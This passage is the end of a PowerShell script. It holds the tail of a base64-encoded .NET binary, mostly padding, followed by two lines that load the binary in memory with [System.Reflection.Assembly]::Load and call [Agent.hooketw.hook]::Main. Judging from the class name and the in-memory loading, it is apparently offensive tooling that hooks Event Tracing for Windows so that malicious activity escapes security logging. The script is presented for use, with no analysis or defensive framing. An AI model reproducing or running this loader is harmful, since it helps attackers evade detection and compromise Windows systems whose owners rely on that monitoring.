J1c3RJbmZvPg0KPC9hc3NlbWJseT4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAADAAAABQyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
    [Agent.hooketw.hook]::Main("")
}
